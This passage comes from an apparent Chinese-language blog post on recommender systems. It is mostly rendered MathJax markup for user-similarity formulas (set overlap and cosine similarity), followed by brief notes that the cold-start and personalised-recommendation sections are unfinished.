153Z"></path></g><g data-mml-node="mfrac" transform="translate(3043.5, 0)"><g data-mml-node="mrow" transform="translate(220, 710)"><g data-mml-node="mo"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="mi" transform="translate(278, 0)"><path data-c="1D441" d="M234 637Q231 637 226 637Q201 637 196 638T191 649Q191 676 202 682Q204 683 299 683Q376 683 387 683T401 677Q612 181 616 168L670 381Q723 592 723 606Q723 633 659 637Q635 637 635 648Q635 650 637 660Q641 676 643 679T653 683Q656 683 684 682T767 680Q817 680 843 681T873 682Q888 682 888 672Q888 650 880 642Q878 637 858 637Q787 633 769 597L620 7Q618 0 599 0Q585 0 582 2Q579 5 453 305L326 604L261 344Q196 88 196 79Q201 46 268 46H278Q284 41 284 38T282 19Q278 6 272 0H259Q228 2 151 2Q123 2 100 2T63 2T46 1Q31 1 31 10Q31 14 34 26T39 40Q41 46 62 46Q130 49 150 85Q154 91 221 362L289 634Q287 635 234 637Z"></path></g><g data-mml-node="mo" transform="translate(1166, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1555, 0)"><path data-c="1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(2127, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(2738.2, 0)"><path data-c="2229" d="M88 -21T75 -21T55 -7V200Q55 231 55 280Q56 414 60 428Q61 430 61 431Q77 500 152 549T332 598Q443 598 522 544T610 405Q611 399 611 194V-7Q604 -22 591 -22Q582 -22 572 -9L570 405Q563 433 556 449T529 485Q498 519 445 538T334 558Q251 558 179 518T96 401Q95 396 95 193V-7Q88 -21 75 -21Z"></path></g><g data-mml-node="mi" transform="translate(3627.4, 0)"><path data-c="1D441" d="M234 637Q231 637 226 637Q201 637 196 638T191 649Q191 676 202 682Q204 683 299 683Q376 683 387 683T401 677Q612 181 616 168L670 381Q723 592 723 606Q723 633 659 637Q635 637 635 648Q635 650 637 660Q641 676 643 679T653 683Q656 683 684 682T767 680Q817 680 843 681T873 682Q888 682 888 672Q888 650 880 642Q878 637 858 637Q787 633 769 597L620 7Q618 0 599 0Q585 0 582 2Q579 5 453 305L326 604L261 344Q196 88 196 79Q201 46 268 46H278Q284 41 284 38T282 19Q278 6 272 0H259Q228 2 151 2Q123 2 100 2T63 2T46 1Q31 1 31 10Q31 14 34 26T39 40Q41 46 62 46Q130 49 150 85Q154 91 221 362L289 634Q287 635 234 637Z"></path></g><g data-mml-node="mo" transform="translate(4515.4, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(4904.4, 0)"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="mo" transform="translate(5389.4, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(5778.4, 0)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g></g><g data-mml-node="mrow" transform="translate(220, -710)"><g data-mml-node="mo"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="mi" transform="translate(278, 0)"><path data-c="1D441" d="M234 637Q231 637 226 637Q201 637 196 638T191 649Q191 676 202 682Q204 683 299 683Q376 683 387 683T401 677Q612 181 616 168L670 381Q723 592 723 606Q723 633 659 637Q635 637 635 648Q635 650 637 660Q641 676 643 679T653 683Q656 683 684 682T767 680Q817 680 843 681T873 682Q888 682 888 672Q888 650 880 642Q878 637 858 637Q787 633 769 597L620 7Q618 0 599 0Q585 0 582 2Q579 5 453 305L326 604L261 344Q196 88 196 79Q201 46 268 46H278Q284 41 284 38T282 19Q278 6 272 0H259Q228 2 151 2Q123 2 100 2T63 2T46 1Q31 1 31 10Q31 14 34 26T39 40Q41 46 62 46Q130 49 150 85Q154 91 221 362L289 634Q287 635 234 637Z"></path></g><g data-mml-node="mo" transform="translate(1166, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1555, 0)"><path data-c="1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(2127, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(2738.2, 0)"><path data-c="222A" d="M591 598H592Q604 598 611 583V376Q611 345 611 296Q610 162 606 148Q605 146 605 145Q586 68 507 23T333 -22Q268 -22 209 -1T106 66T56 173Q55 180 55 384L56 585Q66 598 75 598Q85 598 95 585V378L96 172L98 162Q112 95 181 57T332 18Q415 18 487 58T570 175Q571 180 571 383V583Q579 598 591 598Z"></path></g><g data-mml-node="mi" transform="translate(3627.4, 0)"><path data-c="1D441" d="M234 637Q231 637 226 637Q201 637 196 638T191 649Q191 676 202 682Q204 683 299 683Q376 683 387 683T401 677Q612 181 616 168L670 381Q723 592 723 606Q723 633 659 637Q635 637 635 648Q635 650 637 660Q641 676 643 679T653 683Q656 683 684 682T767 680Q817 680 843 681T873 682Q888 682 888 672Q888 650 880 642Q878 637 858 637Q787 633 769 597L620 7Q618 0 599 0Q585 0 582 2Q579 5 453 305L326 604L261 344Q196 88 196 79Q201 46 268 46H278Q284 41 284 38T282 19Q278 6 272 0H259Q228 2 151 2Q123 2 100 2T63 2T46 1Q31 1 31 10Q31 14 34 26T39 40Q41 46 62 46Q130 49 150 85Q154 91 221 362L289 634Q287 635 234 637Z"></path></g><g data-mml-node="mo" transform="translate(4515.4, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(4904.4, 0)"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="mo" transform="translate(5389.4, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(5778.4, 0)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g></g><rect width="6256.4" height="60" x="120" y="220"></rect></g></g></g></g></svg><svg data-labels="true" preserveAspectRatio="xMaxYMid" viewBox="1778 -1460 1 2420"><g data-labels="true" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="mtd" id="mjx-eqn-14"><g data-mml-node="mtext"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(389, 0)"></path><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z" transform="translate(889, 0)"></path><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" transform="translate(1389, 0)"></path></g></g></g></svg></g></g></g></g></svg></mjx-container></span></p>
<p>余弦相似度：</p>
<p><span class="math display"><mjx-container class="MathJax" jax="SVG" display="true" width="full" style="min-width: 34.3ex"><svg style="vertical-align: -2.466ex; min-width: 34.3ex" xmlns="http://www.w3.org/2000/svg" width="100%" height="6.063ex" role="img" focusable="false"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0) scale(0.0181) translate(0, -1590)"><g data-mml-node="math"><g data-mml-node="mtable" transform="translate(2578, 0) translate(-2578, 0)"><g transform="translate(0 1590) matrix(1 0 0 -1 0 0) scale(55.25)"><svg data-table="true" preserveAspectRatio="xMidYMid" viewBox="5002.3 -1590 1 2680"><g transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="mlabeledtr" transform="translate(0, 130)"><g data-mml-node="mtd"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D464" d="M580 385Q580 406 599 424T641 443Q659 443 674 425T690 368Q690 339 671 253Q656 197 644 161T609 80T554 12T482 -11Q438 -11 404 5T355 48Q354 47 352 44Q311 -11 252 -11Q226 -11 202 -5T155 14T118 53T104 116Q104 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Q21 293 29 315T52 366T96 418T161 441Q204 441 227 416T250 358Q250 340 217 250T184 111Q184 65 205 46T258 26Q301 26 334 87L339 96V119Q339 122 339 128T340 136T341 143T342 152T345 165T348 182T354 206T362 238T373 281Q402 395 406 404Q419 431 449 431Q468 431 475 421T483 402Q483 389 454 274T422 142Q420 131 420 107V100Q420 85 423 71T442 42T487 26Q558 26 600 148Q609 171 620 213T632 273Q632 306 619 325T593 357T580 385Z"></path></g><g data-mml-node="TeXAtom" transform="translate(716, -150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(572, 0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(850, 0)"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g></g></g><g data-mml-node="mo" transform="translate(1987.8, 0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mfrac" transform="translate(3043.5, 0)"><g data-mml-node="mrow" transform="translate(452.3, 710)"><g data-mml-node="mo"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="mi" transform="translate(278, 0)"><path data-c="1D441" d="M234 637Q231 637 226 637Q201 637 196 638T191 649Q191 676 202 682Q204 683 299 683Q376 683 387 683T401 677Q612 181 616 168L670 381Q723 592 723 606Q723 633 659 637Q635 637 635 648Q635 650 637 660Q641 676 643 679T653 683Q656 683 684 682T767 680Q817 680 843 681T873 682Q888 682 888 672Q888 650 880 642Q878 637 858 637Q787 633 769 597L620 7Q618 0 599 0Q585 0 582 2Q579 5 453 305L326 604L261 344Q196 88 196 79Q201 46 268 46H278Q284 41 284 38T282 19Q278 6 272 0H259Q228 2 151 2Q123 2 100 2T63 2T46 1Q31 1 31 10Q31 14 34 26T39 40Q41 46 62 46Q130 49 150 85Q154 91 221 362L289 634Q287 635 234 637Z"></path></g><g data-mml-node="mo" transform="translate(1166, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1555, 0)"><path data-c="1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(2127, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(2738.2, 0)"><path data-c="2229" d="M88 -21T75 -21T55 -7V200Q55 231 55 280Q56 414 60 428Q61 430 61 431Q77 500 152 549T332 598Q443 598 522 544T610 405Q611 399 611 194V-7Q604 -22 591 -22Q582 -22 572 -9L570 405Q563 433 556 449T529 485Q498 519 445 538T334 558Q251 558 179 518T96 401Q95 396 95 193V-7Q88 -21 75 -21Z"></path></g><g data-mml-node="mi" transform="translate(3627.4, 0)"><path data-c="1D441" d="M234 637Q231 637 226 637Q201 637 196 638T191 649Q191 676 202 682Q204 683 299 683Q376 683 387 683T401 677Q612 181 616 168L670 381Q723 592 723 606Q723 633 659 637Q635 637 635 648Q635 650 637 660Q641 676 643 679T653 683Q656 683 684 682T767 680Q817 680 843 681T873 682Q888 682 888 672Q888 650 880 642Q878 637 858 637Q787 633 769 597L620 7Q618 0 599 0Q585 0 582 2Q579 5 453 305L326 604L261 344Q196 88 196 79Q201 46 268 46H278Q284 41 284 38T282 19Q278 6 272 0H259Q228 2 151 2Q123 2 100 2T63 2T46 1Q31 1 31 10Q31 14 34 26T39 40Q41 46 62 46Q130 49 150 85Q154 91 221 362L289 634Q287 635 234 637Z"></path></g><g data-mml-node="mo" transform="translate(4515.4, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(4904.4, 0)"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="mo" transform="translate(5389.4, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(5778.4, 0)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g></g><g data-mml-node="msqrt" transform="translate(220, -937.5)"><g transform="translate(1020, 0)"><g data-mml-node="mo"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="mi" transform="translate(278, 0)"><path data-c="1D441" d="M234 637Q231 637 226 637Q201 637 196 638T191 649Q191 676 202 682Q204 683 299 683Q376 683 387 683T401 677Q612 181 616 168L670 381Q723 592 723 606Q723 633 659 637Q635 637 635 648Q635 650 637 660Q641 676 643 679T653 683Q656 683 684 682T767 680Q817 680 843 681T873 682Q888 682 888 672Q888 650 880 642Q878 637 858 637Q787 633 769 597L620 7Q618 0 599 0Q585 0 582 2Q579 5 453 305L326 604L261 344Q196 88 196 79Q201 46 268 46H278Q284 41 284 38T282 19Q278 6 272 0H259Q228 2 151 2Q123 2 100 2T63 2T46 1Q31 1 31 10Q31 14 34 26T39 40Q41 46 62 46Q130 49 150 85Q154 91 221 362L289 634Q287 635 234 637Z"></path></g><g data-mml-node="mo" transform="translate(1166, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1555, 0)"><path data-c="1D462" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(2127, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(2516, 0)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="mo" transform="translate(2794, 0)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g><g data-mml-node="mi" transform="translate(3072, 0)"><path data-c="1D441" d="M234 637Q231 637 226 637Q201 637 196 638T191 649Q191 676 202 682Q204 683 299 683Q376 683 387 683T401 677Q612 181 616 168L670 381Q723 592 723 606Q723 633 659 637Q635 637 635 648Q635 650 637 660Q641 676 643 679T653 683Q656 683 684 682T767 680Q817 680 843 681T873 682Q888 682 888 672Q888 650 880 642Q878 637 858 637Q787 633 769 597L620 7Q618 0 599 0Q585 0 582 2Q579 5 453 305L326 604L261 344Q196 88 196 79Q201 46 268 46H278Q284 41 284 38T282 19Q278 6 272 0H259Q228 2 151 2Q123 2 100 2T63 2T46 1Q31 1 31 10Q31 14 34 26T39 40Q41 46 62 46Q130 49 150 85Q154 91 221 362L289 634Q287 635 234 637Z"></path></g><g data-mml-node="mo" transform="translate(3960, 0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(4349, 0)"><path data-c="1D463" d="M173 380Q173 405 154 405Q130 405 104 376T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Q21 294 29 316T53 368T97 419T160 441Q202 441 225 417T249 361Q249 344 246 335Q246 329 231 291T200 202T182 113Q182 86 187 69Q200 26 250 26Q287 26 319 60T369 139T398 222T409 277Q409 300 401 317T383 343T365 361T357 383Q357 405 376 424T417 443Q436 443 451 425T467 367Q467 340 455 284T418 159T347 40T241 -11Q177 -11 139 22Q102 54 102 117Q102 148 110 181T151 298Q173 362 173 380Z"></path></g><g data-mml-node="mo" transform="translate(4834, 0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g><g data-mml-node="mo" transform="translate(5223, 0)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"></path></g></g><g data-mml-node="mo" transform="translate(0, 67.5)"><path data-c="221A" d="M263 249Q264 249 315 130T417 -108T470 -228L725 302Q981 837 982 839Q989 850 1001 850Q1008 850 1013 844T1020 832V826L741 243Q645 43 540 -176Q479 -303 469 -324T453 -348Q449 -350 436 -350L424 -349L315 -96Q206 156 205 156L171 130Q138 104 137 104L111 130L263 249Z"></path></g><rect width="5501" height="60" x="1020" y="857.5"></rect></g><rect width="6721" height="60" x="120" y="220"></rect></g></g></g></g></svg><svg data-labels="true" preserveAspectRatio="xMaxYMid" viewBox="1778 -1590 1 2680"><g data-labels="true" transform="matrix(1 0 0 -1 0 0)"><g data-mml-node="mtd" id="mjx-eqn-15" transform="translate(0, 130)"><g data-mml-node="mtext"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(389, 0)"></path><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z" transform="translate(889, 0)"></path><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" transform="translate(1389, 0)"></path></g></g></g></svg></g></g></g></g></svg></mjx-container></span></p>
<p>余弦相似度用的特别多</p>
<h2 id="冷启动问题">冷启动问题</h2>
<p>等待填坑，利用用户注册信息，人工标注等。 已经弃坑，冷启动这个不太好搞，搞不太定。</p>
<h2 id="大众行为个性化推荐">大众行为/个性化推荐</h2>
<p>等待填坑。 半弃坑，没怎么深入做</p>
